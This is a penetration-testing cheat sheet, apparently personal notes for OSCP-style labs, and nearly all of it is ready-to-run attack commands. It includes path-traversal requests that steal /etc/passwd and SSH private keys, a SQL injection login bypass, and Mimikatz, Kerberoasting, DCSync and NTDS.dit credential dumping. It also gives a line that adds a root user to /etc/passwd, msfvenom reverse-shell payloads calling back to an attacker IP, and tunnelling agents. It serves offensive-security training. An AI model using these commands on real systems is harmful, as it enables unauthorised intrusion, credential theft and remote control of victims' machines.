
Enumeration & Initial Access
---
1. Scans
	1. `autorecon <IP>`
	2. `nmap <IP> -p- -sV -sC`
2. Read output of each port in Autorecon 
	1. SMB & LDAP Ports can provide useful info sometimes 
	2. Use `_full_nmap_output.txt` and `tcp80_whatweb.txt` to get version numbers and descriptions to google for exploits 
3. Webserver Enumeration 
	1. Run `gobuster` for subdirectories AND subdomains/vhosts 
		1. `gobuster dir -u http://10.14.1.74/ -w /usr/share/wordlists/dirb/big.txt`
	2. Ferroxbuster better for recursive searches once you find interesting subdirectory (takes too long to recursively do every standard directory otherwise ex: theme) 
		1. `feroxbuster --url http://192.168.232.143/ --depth 5 --wordlist /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -C 404 -x php,md,txt,ym`
	3. . Google exploits for webserver version AND name of service in NMAP/Autorecon scans 
	4. LFI/RFI 
		1. If you see `?=`, likely an LFI 
		2. Try directory traversal 
		3. Ex: SSH Keys 
			1. Check users `curl 'http://192.168.173.245/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd'`
			2. Check user home dir `curl 'http://192.168.173.245/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/home/anita/.ssh/authorized_keys'`
				1. In this exercise, it gave us an ecdsa key, if you get a normal RSA public/private key you can SSH Immediately 
					1. Using John to crack secret word tied to private ecdsa key:
						1. `curl 'http://192.168.173.245/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/home/anita/.ssh/id_ecdsa' > privatekey`
						2. `ssh2john privatekey > hash`
						3. `john --wordlist=/usr/share/wordlists/rockyou.txt hash`
						4. Now you can ssh with `privatekey`
	5. Uploads 
		1. PHP Webshells: `/usr/share/webshells/php`
		2. If you can't upload, but have ability to send web requests, try farming for NTLM hash with an smbserver (reference OSCPB MS01 initial access)
	6. SQLi 
		1. `‘ or ‘1=1`
		2. Check cheatsheet: `https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass`
4. FTP
	1. Anonymous FTP (no password) or `ftp:ftp`
5. SSH 
	1. Use hydra for basic cred list 
6. Pop3d (Port 110)
	1. Connect to check for mail & creds
7. SMB
	1. `enum4linux` and `smbmap` 
	2. Try blank creds 
	3. CrackMapExec 
		1. `crackmapexec smb 172.16.237.10 -u 'joe' -p 'Flowers1' -d medtech.com`
	2. SMBMap 
		1. `smbmap -H 172.16.237.10 -u 'joe' -p 'Flowers1'`
	3. SMBClient 
		1. `smbclient.py medtech.com/joe:Flowers1@172.16.237.10`
8. RPC 
	1. Attempt anonymous login 
9. MySQL 
	1. Login with creds 
		1. `show db`   `use <DB>`
		2. `show tables   use <TABLE>`
		3. `select * from <table>`
10. SMTP
	1. Connect via netcat 
11. Upgrade Unstable Shell
	1. `python3 -c 'import pty; pty.spawn("/bin/bash")'`
12. LDAP 
	1. `ldapsearch -x -h 192.168.162.122 -b "dc=hutch,dc=offsec" > ldap_search.txt`
	2. `cat ldap_search.txt | grep -i "samaccountname"`
	3. Look into LDAP more, find more enumeration commands online 

Active Directory Lateral Movement & Authentication 
--- 
1. EvilWinRM with either Hash or Password:
	1. `evil-winrm -i 192.168.237.121 -u 'Administrator' -H 'b2c03054c306ac8fc5f9d188710b0168'` 
	2. `evil-winrm -i 192.168.237.121 -u 'Administrator' -p 'Password123'`
2. Mimikatz 
	1. Upload copy from `/usr/share/windows-resources/mimikatz` with correct architecture 
	2. Must run in normal pty/tty shell, can not run in EvilWinRM Session 
	3. Commands:
		1. `privilege::debug`
		2. `sekurlsa::logonpasswords`
		3. `sekurlsa::logonPasswords full`
		4. [Mimikatz Cheat Sheet · GitHub](https://gist.github.com/insi2304/484a4e92941b437bad961fcacda82d49)
3. Basic AD Enumeration Commands
	1. `net group /domain`
	2. `net user /domain`
	3. `net group <GROUPNAME> /domain`
4. List Shares 
	1. `Find-DomainShare`
	2. `ls \\dc1.oscp.exam\sysvol\path\to\file`
5. SMB 
	1. CrackMapExec 
		1. `crackmapexec smb 172.16.237.10 -u 'joe' -p 'Flowers1' -d medtech.com`
	2. SMBMap 
		1. `smbmap -H 172.16.237.10 -u 'joe' -p 'Flowers1'`
	3. SMBClient 
		1. `smbclient.py medtech.com/joe:Flowers1@172.16.237.10`
	4. PSExec 
		1. If WinRM is closed, you can get shell with PSExec as well
			1. `impacket-psexec yoshi@172.16.197.82`
	5. WMIExec 
		1. If WinRM is closed, you can get shell with WMIExec as well
			1. `/usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73`
			2. Works for domain accounts and administrators, does not work for local lower level users 
6. Bloodhound 
	1. Transfer `Sharphound.ps1
	2. `Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass`
	3. `Import-Module .\Sharphound.ps1`
	4. `Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\joe\Desktop\ -OutputPrefix "audit"`
	5. Transfer file back to Kali, and open with Bloodhound app & neo4j 
7. AS-REP Roasting 
	1. Impacket tools can request AS-REPs with session keys, TGTs and NTLM hashes in it 
		1. Need username and password of domain account 
		2. `impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete`
		3. Use hashcat help menu to figure out how to crack `hashcat --help | grep -i "Kerberos"`
		4. Run hashcat to crack AS-REP: `sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`
8. Kerberoasting 
	1. Request service ticket and brute force hash of service account 
	2. `sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete`
	3. Can also use Rubeus: `.\Rubeus.exe kerberoast /outfile:hashes.kerberoast`
	4. Crack with hashcat `sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`
9. Silver Tickets 
	1. Used to access internal/private resources like a web server or file share
	2. If you see this, reference Mod 22 notes, doubt it will be applicable 
10. Domain Controller Synchronization 
	1. If we have Replication Directory Change permissions, we can use mimikatz to impersonate DC and request any user creds in domain 
	2. In mimikatz: `lsadump::dcsync /user:corp\dave`
	3. Gives NTLM Hash: `hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`
	4. Impacket method (provide creds of user you have with Replication Directory Change permissions. IP address is IP of DC): `impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"JeffPassword"@192.168.50.70`
11. Pass the Hash & Pass the Ticket 
	1. Used to inject forged tickets into memory to access external resources (file share)
	2. Check Module 23 notes for more info 
12. Dump Creds from SAM/SYSTEM/SECURITY Keys
	1. If you can download the keys from a backup, you can use impacket:
		1. `secretsdump.py -sam SAM -system SYSTEM LOCAL`
13. Dump Creds from Shadow Copies 
	1. List shadow copies: `vshadow.exe -nw -p  C:`
	2. Copy `ntds.dit` to backup location: `copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak`
	3. Copy `HKLM\SYSTEM` as well: `reg.exe save hklm\system c:\system.bak`
	4. Use Impacket again to dump hashes: `impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL`

Windows Priv Esc 
--- 
1. Permissions (Groups & Privileges)
	1. Check with `whoami /all`
		1. Look for `SeImpersonate`, easy root with PrintSpoofer.exe or GodPotato 
		2. Check for other unique privs & groups, and google them 
			1. DNS, Certificates, etc. used in previous HTBs  
2. Environmental Variables
	1. `set`
3. Check for Files of Interest 
	1. KDBX Files: `Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue`
	2. Also look for: `.txt  .doc  .docx  .pdf`
		1. `Get-ChildItem -Path C:\Users\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue`
	3. Non Powershell method: `dir c:\ /s /b | find /i "*.txt*"` OR `dir C:\*.doc* /s /b`
4. Powershell History 
	1. `(Get-PSReadlineOption).HistorySavePath`
	2. `reg query'HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription\OutputDirectory'` 
5. Check for binaries not in System32 
	1. `Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}`
		1. If you can overwrite binary (check with `icacls C:\Path`) then you can put MSFVenom payload in there 
		2. Will need a way to ensure service runs again as elevated user (Scheduled task, or `net stop <service>` then `net start <service>` or `shutdown /r /t 0` to restart box and service)
6. DLL Hijacking 
	1. If a service is running periodically (or on command) and calls a DLL, you can hijack it 
	2. MSFVenom payload for DLL: `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.174.129 LPORT=4444 -f dll > cscapi.dll` 
	3. Note: You must make sure you place the DLL in the path that the service will look for it... Can be found with: `$env:path`
7. Unquoted Service Paths 
	1. Look for services that have a space in path: `wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """`
		1. Ex: `C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe`
	2. Confirm you can start/stop service: `Start-Service <service>  Stop-Service <service>` or `net start <service>`
	3. Use `icacls` tp determine if you can write in the directory with space in name (here both `Enterprise Apps` and `Current Version` are both potential options)
		1. Ex: If you can write in `Enterprise Apps` you can name an executable `Current.exe` and it will be called before `GammaServ.exe` since the path was unquoted 
8. Scheduled Tasks 
	1. Look for any vulnerable or unusual tasks `schtasks /query /fo LIST /v` 
9. Kernel Exploits 
10. WinPEAS 
	1. Transfer from my ~/TOOLS folder 
	2. Use the `winPEASx64.exe` not the `.ps1` version 



Nix Priv Esc
--- 

1. Kernel Version
	1. `uname -a`
2. Sudo Version 
	1. `sudo -V`
	2. Look for 1.8.31 
3. Scheduled Tasks 
	1. `ls -alR /etc/cron.*`
	2. `cat /etc/crontab` `cat /var/spool/cron/crontabs/*`
4. SUID + SGID 
	1. `find / -perm -u=s -type f 2>/dev/null`
5. Writeable Directories 
	1. `find / -writable -type d 2>/dev/null`
6. Environmental Variables 
	1. `env`
7. Bash History for all users 
	1. `cat .bash_history`
8. Sudo -l 
9. /etc/passwd permissions 
	1. If writeable: `echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd` 
10. Capabilities 
	1. `/usr/sbin/getcap -r / 2>/dev/null`
	2. Looking for: `cap_setuid+ep`
12. LinPEAS 
13. Check interesting directories 
	1. All users home directories 
	2. Check / for unusual directories 
	3. Check /tmp (likely empty, as it is non-persistent)
	4. Check /opt 

Useful Techniques 
--- 
1. Chisel
	1. Server: `chisel server -p 8000 --reverse`
	2. Client: `chisel.exe client 192.168.45.164:8000 R:socks`
2. Ligolo-ng 
	1. Setup  
		1. `sudo ip tuntap add user [your_username] mode tun ligolo`
		2. `sudo ip link set ligolo up`
		3. `ligolo-proxy -selfcert -laddr 0.0.0.0:11601`
			1. Can use v0.7 proxy, stored in `/usr/bin`... need to alter agent version based on target OS & kernel version 
		4. `agent.exe -connect <attacker IP here>:11601 -ignore-cert`
			1. Different agents stored in my `~/TOOLS` directory 
		5. `sudo ip route add 192.168.110.0/24 dev ligolo`
		6. In ligolo: `start`
	3. Cleanup 
		1. `sudo ip route del 192.168.110.0/24 dev ligolo`
		2. `sudo ip link set ligolo down`
3. MSFVenom Payloads 
	1. Stageless x86 Payloads (32-bit)
		1. Windows Bind: `msfvenom -p windows/shell_bind_tcp RHOST=0.0.0.0 LPORT=9999 -f exe > shell.exe` 
		2. Windows Meterpreter Bind: `msfvenom -p windows/meterpreter_bind_tcp RHOST=0.0.0.0 LPORT=9999 -f exe > shell.exe`
		3. Windows Reverse TCP: `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.163 LPORT=443 -f exe > shell.exe  `
		4. Windows Meterpreter Reverse TCP: `msfvenom -p windows/meterpreter_reverse_tcp LHOST=192.168.45.163 LPORT=443 -f exe > shell.exe`
	2. Staged x86 Payloads (32-bit)
		1. Windows Bind: `msfvenom -p windows/shell/bind_tcp RHOST=0.0.0.0 LPORT=9999 -f exe > shell.exe` 
		2. Windows Meterpreter Bind: `msfvenom -p windows/meterpreter/bind_tcp RHOST=0.0.0.0 LPORT=9999 -f exe > shell.exe`
		3. Windows Reverse TCP: `msfvenom -p windows/shell/reverse_tcp LHOST=192.168.45.163 LPORT=443 -f exe > shell.exe  `
		4. Windows Meterpreter Reverse TCP: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.163 LPORT=443 -f exe > shell.exe`
	1. Stageless x64 Payloads (64-bit)
		1. Windows Bind: `msfvenom -p windows/x64/shell_bind_tcp RHOST=0.0.0.0 LPORT=9999 -f exe > shell.exe` 
		2. Windows Meterpreter Bind: `msfvenom -p windows/x64/meterpreter_bind_tcp RHOST=0.0.0.0 LPORT=9999 -f exe > shell.exe`
		3. Windows Reverse TCP: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.163 LPORT=443 -f exe > shell.exe  `
		4. Windows Meterpreter Reverse TCP: `msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.45.163 LPORT=443 -f exe > shell.exe`
	2. Staged x64 Payloads (64-bit)
		1. Windows Bind: `msfvenom -p windows/x64/shell/bind_tcp RHOST=0.0.0.0 LPORT=9999 -f exe > shell.exe` 
		2. Windows Meterpreter Bind: `msfvenom -p windows/x64/meterpreter/bind_tcp RHOST=0.0.0.0 LPORT=9999 -f exe > shell.exe`
		3. Windows Reverse TCP: `msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.45.163 LPORT=443 -f exe > shell.exe  `
		4. Windows Meterpreter Reverse TCP: `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.163 LPORT=443 -f exe > shell.exe`
4. Proxychains Scan Script 
	1. To avoid nmap issues through Chisel, `~/TOOLS` has `scan.sh` script  
5. SSH Redirection to Internally Hosted Webservers 
	1. Check connections: `ss -antpu` or `netstat -antpu`
	2. `ssh -L 8000:127.0.0.1:8000 -o "UserKnownHostsFile=/dev/null" -i anita2 anita@192.168.173.246 -p 2222
6. Cracking KDBX  Files 
	1. Get hash of password manager password: `keepass2john Database.kdbx > passhash.txt`
	2. Crack hash for access: `john --wordlist=/usr/share/wordlists/rockyou.txt passhash.txt`
	3. Open with KeePass GUI on Kali 
7. .GIT Directories 
	1. Run gitdumper and clone directory structure with `git-dumper http://<IP> ./git` where `./git` is the directory on Kali you want to dump the output 
	2. Use git commands to look at info:
		1. `git log` : Look at commit history 
		2. `git show` : Show most recent commit 